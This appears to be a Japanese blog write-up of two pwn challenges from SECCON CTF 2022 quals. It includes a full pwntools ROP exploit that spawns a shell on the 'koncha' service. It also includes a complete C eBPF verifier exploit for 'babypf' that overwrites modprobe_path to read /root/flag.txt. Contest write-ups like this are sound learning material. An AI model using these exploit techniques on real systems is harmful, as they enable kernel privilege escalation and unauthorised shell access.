---
title: SECCON CTF 2022 quals
date: 2022-11-14 23:35:05
tags: [ctf,writeup,jp]
---

SECCON CTF 2022にKUDoSで出場 
全体21位、国内2位でした  

自分はpwnの2問を解いたのでそのwriteupを載せます

- [pwn](#pwn)
	- [koncha(96pt 111solves)](#koncha)
	- [babypf(278pt 10solves)](#babypf)
- [おわり](#おわりに)

## pwn
### koncha
scanfのbuffer over flow
1回目で何も入力しないことでstack上のゴミからlibcアドレスのリーク  
2回目でropをするだけ

```C
#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "chall.ptc"
#FILE_NAME = "chall"

#"""
HOST = "koncha.seccon.games"
PORT = 9001
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    conn = remote(HOST, PORT)
else:
    conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
#
libc = ELF('./lib/libc.so.6')
off_binsh = next(libc.search(b"/bin/sh"))
off_system = libc.symbols["system"]
off_dust = 0x7ffff7fc82e8 - 0x7ffff7dd7000
off_rdi_ret = 0x23b6a
off_only_ret = 0x23b6a+1

def align2qword(s):
    if len(s) > 8:
        print("[ERROR] align2qword: argument larger than 8bytes")
        exit()
    return u64(s+b'\x00'*(8-len(s)))

def exploit():
    # rbp-0x30

    conn.sendlineafter("?\n", "")
    conn.recvuntil(", ")
    libc_dust = align2qword(conn.recvuntil("!")[:-1])
    libc_base = libc_dust - off_dust
    print(hex(libc_dust))
    print(hex(libc_base))

    payload = b"A"*0x58
    payload += p64(libc_base+off_only_ret)
    payload += p64(libc_base+off_rdi_ret)
    payload += p64(libc_base+off_binsh)
    payload += p64(libc_base+off_system)
    conn.sendlineafter("?\n", payload);
    conn.interactive()

if __name__ == "__main__":
    exploit()
```
　
### babypf
eBPFに脆弱なパッチがあたっている  

```
diff --git a/linux-5.19.12/kernel/bpf/verifier.c b/linux-5.19.12-patched/kernel/bpf/verifier.c
index 3391470611..44af26055b 100644
--- a/linux-5.19.12/kernel/bpf/verifier.c
+++ b/linux-5.19.12-patched/kernel/bpf/verifier.c
@@ -8925,10 +8925,8 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
                break;
        case BPF_LSH:
                if (umax_val >= insn_bitness) {
-                       /* Shifts greater than 31 or 63 are undefined.
-                        * This includes shifts by a negative number.
-                        */
-                       mark_reg_unknown(env, regs, insn->dst_reg);
+                       /* Shifts greater than 31 or 63 results in 0. */
+                       mark_reg_known_zero(env, regs, insn->dst_reg);
                        break;
                }
                if (alu32)
@@ -8938,9 +8936,7 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
                break;
        case BPF_RSH:
                if (umax_val >= insn_bitness) {
-                       /* Shifts greater than 31 or 63 are undefined.
-                        * This includes shifts by a negative number.
-                        */
-                       mark_reg_unknown(env, regs, insn->dst_reg);
+                       /* Shifts greater than 31 or 63 results in 0. */
+                       mark_reg_known_zero(env, regs, insn->dst_reg);
                        break;
                }
                if (alu32)
```
シフト演算にでbit長を超えるシフト演算をすると検証器はその値を未定義(unknown)にするところを
定数0にしている。
これをどうやってLPEするか

自分は開催前に作問者yudaiさん作の[pawnyable](https://pawnyable.cafe/)を履修していたので
やることは大体わかった。  

最終的なcのexploitコードもこの演習で使ったものの流用なのでヘルパーとかかなり酷似しているがご勘弁いただきたい
というか以下の解説もほぼpawnyableの受け売りでしたわ

#### 脆弱なコードの実行
まずは脆弱なコードを実行させるところだが

即値で演算をしてみる
```
	BPF_ALU32_IMM(BPF_RSH, BPF_REG_8, 32),
	BPF_ALU64_IMM(BPF_RSH, BPF_REG_8, 64),
```

みたいなことをすると検証器に怒られたので
レジスタを経由してみる

```
        BPF_MOV64_IMM(BPF_REG_4, 32),
        BPF_ALU32_REG(BPF_LSH, BPF_REG_8, BPF_REG_4),
```
検証器のログをチェックするとちゃんと定数になっている
> 22: (6c) w8 <<= w4                    ; R4_w=32 R8_w=0

ちなみにパッチがあたっていないとちゃんと未定義になる

> 22: (6c) w8 <<= w4                    ; R4_w=32 R8_w=scalar(umax=4294967295,var_off=(0x0; 0xffffffff))

#### 0と1を誤認させる
検証器の悪用するにあたってこれが大事らしい
32bitレジスタで1を32bit LSHすると1になるのでこれは簡単に作れる
ちなみにパッチのコメントにある通り負数でもこれは作れて(-1)bitシフトしても壊れてくれる

検証器が0と思っているが実際は1みたいな状況を作れると
乗算すると、任意の値を検証器は0と勘違いしてくれる

#### skb_load_bytesを利用したAAR/AAW
詳しくは[pawnyable 6章](https://pawnyable.cafe/linux-kernel/LK06/exploit.html)も書いているが
skb_load_bytesを利用してoverflowを引き起こすことができる。
検証器は1byteの書き込みだから許すけど本当は9bytes書き込むよ的な感じ

もう一つ大事なことでBPFスタックにはポインタを保存できて
かつその値の追跡も行ってくれる。(完全な受け売り)
そのためBPFスタックに定数を保存したBPFスタックのアドレスを格納して、
skb_load_bytesのオーバーフローでアドレスの下位1bytesを書き換えても
検証器はまだそこに定数を保存したアドレスがあると勘違いするので
AARが作れる。

以下のダンプはこれを利用してBPFスタック周辺をリークしてみた様子

```
0x000: ffffffffb3d4fdf5
0x008: ffff97adc36b6600
0x010: 00000000b4000c67
0x018: 0000000000400cc0
0x020: ffffac53c018fcd8
0x028: 0000000000000000
0x030: ffff97adc3754400
0x038: ffffffffb3accc09
0x040: ffffac53c018fdd8
0x048: ffffffffb3d91b3b
0x050: ffff97adc3754800
0x058: ffff97adc3767700
0x060: ffffac53c018fcb0
0x068: ffffffffc034b725
0x070: ffffac53c0095000
0x078: ffff97adc3754400
0x080: 0000000000000001
0x088: 0000000000000001
0x090: 4141414141414141
0x098: ffffac53c018fc98
0x0a0: 0000000000000000
0x0a8: 0000000000000000
0x0b0: ffffac53c018fd10
0x0b8: ffffffffb3d8babf
0x0c0: ffffac53c018fd10
0x0c8: ffffffffb3d5839d
0x0d0: 0000000000000282
0x0d8: ffff97adc3767700
0x0e0: 0000000000000009
0x0e8: ffffac53c018fdc8
0x0f0: ffff97adc3754800
0x0f8: ffff97adc3754400
```

オフセット0x90をoverflowさせてオフセット0x98のポインタを壊している
オフセット0xb8とかはカーネルのアドレスっぽいのでここからカーネルのベースアドレスを特定する。

AAWも同じ原理で、検証器はスタックのアドレスだと思っている値を任意のアドレスにすることで
AAWが作れる。exploitではmodprobe_pathを利用した

#### exploit
```c
#include <linux/bpf.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include "bpf_insn.h"

unsigned long kernel_base = 0;
unsigned long addr_heap = 0;

unsigned long off_target   = 0xffffffffb298babf - 0xffffffffb2400000;
unsigned long off_modprobe = 0xffffffffbd238340 - 0xffffffffbc400000;

void fatal(const char *msg) 
{
	perror(msg);
	exit(1);
}

int bpf(int cmd, union bpf_attr *attrs) 
{
	return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int map_create(int val_size, int max_entries)
{
	union bpf_attr attr = {
		.map_type = BPF_MAP_TYPE_ARRAY,
		.key_size = sizeof(int),
		.value_size = val_size,
		.max_entries = max_entries
	};
	int mapfd = bpf(BPF_MAP_CREATE, &attr);
	if(mapfd < 0) fatal("bpf(BPF_MAP_CREATE)");
	return mapfd;
}

int map_update(int mapfd, int key, void* pval) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (uint64_t)&key,
		.value = (uint64_t)pval,
		.flags = BPF_ANY
	};

	int res = bpf(BPF_MAP_UPDATE_ELEM, &attr);
	if(res < 0) fatal("bpf(BPF_MAP_UPDATE_ELEM)");
	return res;
}

int map_lookup(int mapfd, int key, void *pval)
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (uint64_t)&key,
		.value = (uint64_t)pval,
		.flags = BPF_ANY
	};

	return bpf(BPF_MAP_LOOKUP_ELEM, &attr);
}

unsigned long leak_address(int mapfd) {
	char verifier_log[0x10000];
	unsigned long val;

	struct bpf_insn insns[] = {
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_ARG1),
		BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x8, 0), // fp_x8 key=0
		BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
		BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // map_lookup_elem(mapfd, &key)
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
		BPF_EXIT_INSN(),
		
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0),
		
		BPF_MOV64_IMM(BPF_REG_4, -1),

		// r8 = 0 / real 1
		BPF_ALU32_REG(BPF_LSH, BPF_REG_8, BPF_REG_4),
		BPF_ALU64_IMM(BPF_RSH, BPF_REG_8, 31),
		
		// r8 = 1 / real 0x10
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x9-1),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x1),

		BPF_MOV64_IMM(BPF_REG_3, 1),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -0x28),
		BPF_MOV64_REG(BPF_REG_3, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x28),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_3, -0x18),
		BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),			
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x20),		// arg4 = fp-0x20

		BPF_MOV64_IMM(BPF_REG_ARG2, 0),
		BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_8),
		BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_7),
		BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),

		BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_FP, -0x18),
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0),
	
		// map_update_elem	
		BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x8, 0), 			// [fp-0x8]=0(key)
		
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_8, -0x10),	// [fp-0x10]=r2
		BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),					// arg1 = mapfd
		BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x8),			// arg2 = fp-0x8
		BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),		// arg3 = fp=010
		BPF_MOV64_IMM(BPF_REG_ARG4, 0),
		BPF_EMIT_CALL(BPF_FUNC_map_update_elem),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};

	union bpf_attr prog_attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = sizeof(insns) / sizeof(insns[0]),
		.insns = (uint64_t) insns,
		.license = (uint64_t)"GPL v2",
		.log_level = 2,
		.log_size = sizeof(verifier_log),
		.log_buf = (uint64_t)verifier_log,
	};

	int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
	if (progfd == -1) {
		printf("%s\n", verifier_log);
		fatal("bpf(BPF_PROG_LOAD)");
	}
	printf("%s\n", verifier_log);

	int socks[2];
	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
		fatal("socketpair");
	if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
		fatal("setsockopt");
	

	int i;
	char payload[0x10];
	*(unsigned long*)&payload[0] = 0x4141414141414141;
	for(i = 0; i < 0x100; i+=8) {
		val = 1;	
		map_update(mapfd, 0, &val);
		payload[0x8] = i;
		write(socks[1], payload, 0x9);
		map_lookup(mapfd, 0, &val);
	
		printf("0x%03lx: %016llx\n", i, val);
		if(i == 0xb8)
			kernel_base = val - off_target;	
	}
	printf("kbase = %016llx\n", kernel_base);
	return val;
}

void aaw64(int mapfd, unsigned long addr, unsigned long data) {
	char verifier_log[0x10000];
	unsigned long val;

	struct bpf_insn insns[] = {
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_ARG1),
		BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x8, 0), // fp_x8 key=0
		BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),
		BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -8),
		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // map_lookup_elem(mapfd, &key)
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
		BPF_EXIT_INSN(),
		
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),			// r9 = mapaddr
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0), 	// r8 = &map[0]
		
		BPF_MOV64_IMM(BPF_REG_4, -1),

		// r8 = 0 / real 1
		BPF_ALU32_REG(BPF_LSH, BPF_REG_8, BPF_REG_4),
		BPF_ALU64_IMM(BPF_RSH, BPF_REG_8, 31),
		
		// r8 = 1 / real 0x10
		BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x10-1),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x1),

		
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_9, -0x18),		// [fp-0x18] = mapaddr
		BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),			
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x20),		// arg3 = fp-0x20

		BPF_MOV64_IMM(BPF_REG_ARG2, 0),						// arg2 = 0
		BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_8),				// arg4 = len(1/0x10)
		BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_7),				// arg1 = skb
		BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),

		BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_FP, -0x18),	// r9 = [fp-0x18]
	
		BPF_MOV64_IMM(BPF_REG_1, data >> 32),
		BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, data & 0xffffffff),
		BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_1, 0), 			// [fp-0x28] = data

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};

	union bpf_attr prog_attr = {
		.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
		.insn_cnt = sizeof(insns) / sizeof(insns[0]),
		.insns = (uint64_t) insns,
		.license = (uint64_t)"GPL v2",
		.log_level = 2,
		.log_size = sizeof(verifier_log),
		.log_buf = (uint64_t)verifier_log,
	};

	int progfd = bpf(BPF_PROG_LOAD, &prog_attr);
	if (progfd == -1) {
		printf("%s\n", verifier_log);
		fatal("bpf(BPF_PROG_LOAD)");
	}
	printf("%s\n", verifier_log);

	int socks[2];
	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
		fatal("socketpair");
	if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
		fatal("setsockopt");

	int i;
	char payload[0x10];
	*(unsigned long*)&payload[0] = 0x4141414141414141;
	*(unsigned long*)&payload[8] = addr;
	val = 1;	
	map_update(mapfd, 0, &val);
	write(socks[1], payload, 0x10);
	map_lookup(mapfd, 0, &val);
	printf("target = 0x%016llx\n", addr);
	//read(socks[0], payload, 0x10);
}


int main()
{
	int mapfd = map_create(0x8, 2);
	int socks[2];
	unsigned long d = 0x6d6b2f706d742f; // /tmp/km	
	leak_address(mapfd);
	aaw64(mapfd, kernel_base+off_modprobe, d);
	
	// after overwrite modprobe_path
	system("touch /tmp/flag");
	system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/invalid");
	system("chmod u+x /tmp/invalid");
	system("echo '#!/bin/sh\n cat /root/flag.txt > /tmp/flag' > /tmp/km ");
	system("chmod u+x /tmp/km");
	system("/tmp/invalid");

	return 0;
}
```

## おわり
10solves問題解けたから褒めたいけど、他のpwnが全然解けてないのでダメです

解きたい問題解けなくて悲しかった
久々にフルメンバーで参加して楽しかった

運営の方、チームメンバーありがとうございマス！
